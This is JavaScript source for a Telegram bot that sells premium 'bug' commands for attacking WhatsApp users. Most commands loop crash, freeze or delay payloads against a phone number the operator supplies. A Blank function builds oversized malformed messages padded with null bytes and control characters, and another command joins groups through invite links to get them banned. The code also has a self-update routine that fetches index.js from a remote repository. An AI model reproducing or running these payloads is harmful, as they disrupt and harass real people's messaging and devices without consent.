bot.action("controls_group", async ctx => {
  try { await ctx.answerCbQuery(); } catch (error) {}
  const body = "‎↯ /addpremgb - Add Premium Group\n‎↯ /delpremgb - Delete Premium Group\n‎↯ /listpremiumgb - List Premium Group\n‎↯ /addgroup - Add Group Whitelist\n‎↯ /delgroup - Delete Group Whitelist\n‎↯ /listgroup - List Registered Group";
  const keyboard = [
    [controlButton("「 𝖡𝖠𝖢𝖪 」", "/controls", "danger", "5395695537687123235"), controlButton("「 𝖭𝖤𝖷𝖳 」", "controls_bot", "success", "5416117059207572332")]
  ];
  await renderControlPage(ctx, "GROUP MANAGEMENT", body, keyboard);
});

bot.action("controls_bot", async ctx => {
  try { await ctx.answerCbQuery(); } catch (error) {}
  const body = "‎↯ /addsender - Add Sender Number\n‎↯ /resetsesi - Reset Session\n‎↯ /setcd - Set Bot Cooldown\n‎↯ /anticulik on|off - Group Protection\n‎↯ /statusbot - Bot Status\n‎↯ /backupdata - Backup Database\n‎↯ /blockcmd - Disable Command\n‎↯ /opencmd - Enable Command";
  const keyboard = [
    [controlButton("「 𝖡𝖠𝖢𝖪 」", "/controls", "danger", "5395695537687123235"), controlButton("「 MAIN MENU 」", "/start", "danger", "5395695537687123235")]
  ];
  await renderControlPage(ctx, "BOT CONTROL", body, keyboard);
});

bot.action("/bug", async ctx => {
    try { await ctx.answerCbQuery(); } catch (error) {}
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const senderStatus = isWhatsAppConnected
  ? '<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Connected'
  : '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Disconnected';

  const bugMenu = `
<blockquote><strong><tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> 𝗦 𝗔 𝗟 𝗩 𝗔 𝗗 𝗢 𝗥 <tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji></strong></blockquote>
<tg-emoji emoji-id="5769547529993588669">👑</tg-emoji> Developer : @parkyoujoung
<tg-emoji emoji-id="6030579106620378674">🌐</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="5382357040008021292">🆕</tg-emoji> Version : 2.0 [ New Updated ]
<tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> Type Script : Free Spam & Not Spam
<tg-emoji emoji-id="5370577035636786019">📱</tg-emoji> Language : Javascript / Node.Js
<blockquote><strong><tg-emoji emoji-id="5282843764451195532">🖥</tg-emoji> 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> ID : ${userId}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Username : ${username}
<blockquote><strong><tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Connection : ${senderStatus}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Runtime : ${runtimeStatus}
<tg-emoji emoji-id="5350809912513424561">🔊</tg-emoji> Memory : ${memoryStatus}
<blockquote><strong><tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> 𝖡𝖴𝖦 𝖬𝖤𝖭𝖴</strong></blockquote>
‎↯ /xover → Delay Invisible
‎↯ /xorce → Forcelose Android
‎↯ /blanc → Blank Click
‎↯ /fearful → Freeze Invisible
‎↯ /chloe → Delay Invisible V2
‎↯ /voltex → Blank Not Spam
<blockquote><strong><tg-emoji emoji-id="5382357040008021292">🆕</tg-emoji> 𝖡𝖠𝖭𝖭𝖤𝖣 𝖦𝖱𝖮𝖴𝖯</strong></blockquote>
‎↯ /baneado → Banned Group [ Testering ]
`;

  const keyboard = [
    [
      {
        text: "「 𝖡𝖠𝖢𝖪 」",
        callback_data: "/start",
        style: "danger",
        icon_custom_emoji_id:'5395695537687123235'
      },
      {
        text: "「 𝖢𝖱𝖤𝖠𝖳𝖮𝖱 」",
        url: "https://t.me/parkyoujoung",
        style: "danger",
        icon_custom_emoji_id:'5217822164362739968'
      },
      {
        text: "「 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 」",
        url: "https://t.me/Salvadorinformation",
        style: "danger",
        icon_custom_emoji_id:'5282843764451195532'
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(bugMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

// ================ Block & Open Cmd ================
const cmdFile = "./database/cmd.json";

let cmdData = { blocked: [] };

if (fs.existsSync(cmdFile)) {
  try {
    cmdData = JSON.parse(fs.readFileSync(cmdFile));
  } catch (err) {
    cmdData = { blocked: [] };
  }
}

function saveCmd() {
  fs.writeFileSync(cmdFile, JSON.stringify(cmdData, null, 2));
}

function isCommandBlocked(cmd) {
  return cmdData.blocked.includes(cmd);
}

bot.command("blockcmd", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner/admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/blockcmd /command");
  }
  const command = args[1].toLowerCase();
  if (!cmdData.blocked.includes(command)) {
    cmdData.blocked.push(command);
    saveCmd();
  }
  ctx.reply(`🚫 Command ${command} berhasil diblokir.`);
});

bot.command("opencmd", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner/admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/opencmd /command");
  }
  const command = args[1].toLowerCase();
  cmdData.blocked = cmdData.blocked.filter(c => c !== command);
  saveCmd();
  ctx.reply(`✅ Command ${command} sudah dibuka.`);
});

bot.command(
  "xorce",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/xorce")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /xorce 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Blanc Visible
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> Status : Processing....
━━━━━━━━━━━━━━━━━━━
`;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "HTML",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 30; i++) {
            console.log(chalk.yellow(` [ ✅ ] STATUS : SUCCESS`));
            await Blank(sock, target);
              await sleep(3500);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Blanc Visible
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Success
<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji> Attack From : ${username}
━━━━━━━━━━━━━━━━━━━
`,
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.log("[ ERROR ]:");
          console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan xorce.");
        }
      })();
  }
);
bot.command(
  "voltex",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/voltex")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /voltex 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Crash Android
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> Status : Processing....
━━━━━━━━━━━━━━━━━━━
`;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "HTML",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 20; i++) {
            console.log(chalk.yellow(`[ ✅ ] STATUS : SUCCESS`));
            await XkaCrash(sock, target);
              await sleep(1500);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Crash Android
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Success
<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji> Attack From : ${username}
━━━━━━━━━━━━━━━━━━━
`,
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.log("[ ERROR ]");
          console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan voltex.");
        }
      })();
  }
);
bot.command(
  "xover",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/xover")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /xover 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Delay Visible
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> Status : Processing....
━━━━━━━━━━━━━━━━━━━
`;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "HTML",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 10; i++) {
            console.log(chalk.yellow(`[ ✅ ] STATUS : SUCCESS`));
            await XkaHitam(sock, target);
              await sleep(1500);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Delay Visible
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Success
<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji> Attack From : ${username}
━━━━━━━━━━━━━━━━━━━
`,
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.log("[ ERROR ]");
          console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan xover.");
        }
      })();
  }
);
bot.command(
  "chloe",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/chloe")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /chloe 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Delay Invisible V2
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> Status : Processing....
━━━━━━━━━━━━━━━━━━━
`;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "HTML",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 20; i++) {
            console.log(chalk.yellow(`[ ✅ ] STATUS : SUCCESS`));
            await DelayXkA(sock, target);
              await sleep(2500);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Delay Invisible V2
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Success
<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji> Attack From : ${username}
━━━━━━━━━━━━━━━━━━━
`,
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.log("[ ERROR ]");
          console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan xover.");
        }
      })();
  }
);
bot.command(
  "blanc",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/blanc")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /blanc 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Blanc Click
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> Status : Processing....
━━━━━━━━━━━━━━━━━━━
`;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "HTML",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 10; i++) {
            console.log(chalk.yellow(`[ ✅ ] STATUS : SUCCESS`));
            await KxA(sock, target);
              await sleep(2500);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Blanc Click
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Success
<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji> Attack From : ${username}
━━━━━━━━━━━━━━━━━━━
`,
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.log("[ ERROR ]");
          console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan blanc.");
        }
      })();
  }
);
bot.command(
  "fearful",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/fearful")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /fearful 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Freeze Visible
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> Status : Processing....
━━━━━━━━━━━━━━━━━━━
`;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "HTML",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 20; i++) {
            console.log(chalk.yellow(`[ ✅ ] STATUS : SUCCESS`));
            await KxAKiwkiw(sock, target);
              await sleep(2500);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Freeze Visible
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Success
<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji> Attack From : ${username}
━━━━━━━━━━━━━━━━━━━
`,
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.log("[ ERROR ]");
          console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan fearful.");
        }
      })();
  }
);
bot.command(
  "baneado",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/baneado")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }

    const chatId = ctx.chat.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!args) {
      return ctx.reply(
        "🪧 ☇ Format:\n/baneado <link_undangan|group_id>\n\nExample:\n/baneado https://chat.whatsapp.com/ABCdef123\n/baneado 123456789@g.us"
      );
    }

    let groupJid;

    try {
      const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
      const matchInvite = args.match(inviteRegex);

      if (matchInvite) {
        const code = matchInvite[1];
        const progressMsg = await ctx.reply("⏳ Bergabung ke grup via link...");

        try {
          const joinResult = await sock.groupAcceptInvite(code);
          groupJid = joinResult;
          await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            undefined,
            `✅ Berhasil bergabung ke grup: ${groupJid}`
          );
        } catch (joinErr) {
          const errMsg = (joinErr?.message || "").toLowerCase();

          if (errMsg.includes("conflict") || errMsg.includes("already") || errMsg.includes("member") || errMsg.includes("exists")) {
            try {
              console.log(`⚠️ Conflict/Already member, mencoba ambil JID...`);
              const inviteInfo = await sock.groupGetInviteInfo(code);
              groupJid = inviteInfo.id;
              console.log(`✅ Berhasil ambil JID grup: ${groupJid}`);
              await ctx.telegram.editMessageText(
                chatId,
                progressMsg.message_id,
                undefined,
                `✅ Sudah bergabung, melanjutkan ke grup: ${groupJid}`
              );
            } catch (infoErr) {
              console.log(`❌ Gagal ambil JID: ${infoErr.message}`);
              return ctx.reply(`❌ Gagal memproses grup: ${infoErr.message}`);
            }
          } else {
            console.log(`❌ Error join: ${joinErr.message}`);
            return ctx.reply(`❌ Gagal memproses grup: ${joinErr.message}`);
          }
        }
      } else {
        if (!args.endsWith("@g.us")) {
          return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
        }
        groupJid = args;
      }
    } catch (err) {
      return ctx.reply(`❌ Gagal memproses grup: ${err.message}`);
    }

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Banned Group [ Percobaan ]
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> Status : Processing....
━━━━━━━━━━━━━━━━━━━
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "「🔍」View Group ",
                url: "https://chat.whatsapp.com/"
              }
            ]
          ]
        }
      }
    );

    const processMessageId = processMessage.message_id;

    try {
      await BanGroup(sock, jid);

      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        undefined,
        `
<blockquote><tg-emoji emoji-id="5276032951342088188">💥</tg-emoji> Sᗩᒪᐯ4ᗪOᖇ IS ᕼEᖇE <tg-emoji emoji-id="5276032951342088188">💥</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> Target : ${q}
<tg-emoji emoji-id="5987813726412083870">💣</tg-emoji> Type Attack : Banned Group [ Percobaan ]
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Status : Success
<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji> Attack From : ${username}
━━━━━━━━━━━━━━━━━━━
`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "「📱」Check Group ",
                  url: "https://wa.me/13135550002"
                }
              ]
            ]
          }
        }
      );
    } catch (err) {
  console.error("=== Error ===");
  console.error(err);
  console.error(err.stack);
      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        undefined,
        `
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
Pesan Error Message
━━━━━━━━━━━━━━⪼
┊々 Pengirim : ${username}
┊々 Target : ${groupJid}
┊々 Status : ❌ Failed: ${err.message}
`,
        {
          parse_mode: "HTML"
        }
      );
    }
  }
);

//============( FUNCTION ) ======\\
async function Blank(sock,target) {
const unicode = "\u0000" + "\u000F" + "\u007F" + "\u0001" + "\u0002" + "\u000F" + "\u000D" + "\u001A" + "\u001B" + "\u0010";

const rpt = 999999;

  const zyz = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "}" + "\0".repeat(300000)
          },
          nativeFlowMessage: {
            buttons: unicode.repeat(rpt)
          }
        }
      }
    }
  };

const mseg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "assalamualaikum" + "Paket".repeat(300000)
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 300000 }, () => ({}))
          }
        }
      }
    }
  };
  
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "assalamualaikum" + "Paket".repeat(300000)
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 300000 }, () => ({}))
          }
        }
      }
    }
  };


  await sock.relayMessage(target, zyz, {});
await sock.relayMessage(target, mseg, {});
sock.relayMessage(target, msg, {});
  console.log("✅ SUCCESS SEND BUGS");
}

//============( AUTO UPDATE ) =======\\
const UPDATE_URL = "https://raw.githubusercontent.com/parkyoujoung123/SalvadorUpdates/refs/heads/main/index.js";
const UPDATE_FILE_PATH = path.join(__dirname, "index.js");
const UPDATE_TEMP_PATH = path.join(__dirname, "index.js");
const UPDATE_BACKUP_PATH = path.join(__dirname, "index.js");

function downloadUpdate(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath);
    let settled = false;
    const finish = error => {
      if (settled) return;
      settled = true;
      file.close(() => {
        if (error) fs.rm(outputPath, { force: true }, () => {});
        error ? reject(error) : resolve();
      });
    };

    const request = https.get(url, { headers: { "User-Agent": "SalvadorBot-Updater" } }, res => {
      if (res.statusCode !== 200) {
        res.resume();
        return finish(new Error(`HTTP_${res.statusCode}`));
      }
      res.pipe(file);
      file.once("finish", () => finish());
    });
    request.setTimeout(30000, () => request.destroy(new Error("UPDATE_TIMEOUT")));
    request.once("error", finish);
    file.once("error", finish);
  });
   }

process.on("uncaughtException", err => {
  console.error("Uncaught Exception:", err?.stack || err?.message || err);
});

process.on("unhandledRejection", err => {
  console.error("Unhandled Rejection:", err?.stack || err?.message || err);
});

bot.launch()
  .then(() => {
    console.log("✅ Telegram bot berhasil terhubung dan berjalan.");
  })
  .catch(error => {
    const description = error?.response?.description || error?.message || String(error);
    console.error("❌ Telegram bot gagal dijalankan:", description);

    if (/401|unauthorized|invalid token/i.test(description)) {
      console.error("➡️ Periksa tokenBot di settings/config.js melalui @BotFather.");
    } else if (/getme|timeout|econn|enotfound|network|socket/i.test(description)) {
      console.error("➡️ Periksa koneksi server ke https://api.telegram.org dan coba Restart lagi.");
    }

    process.exitCode = 1;
  });
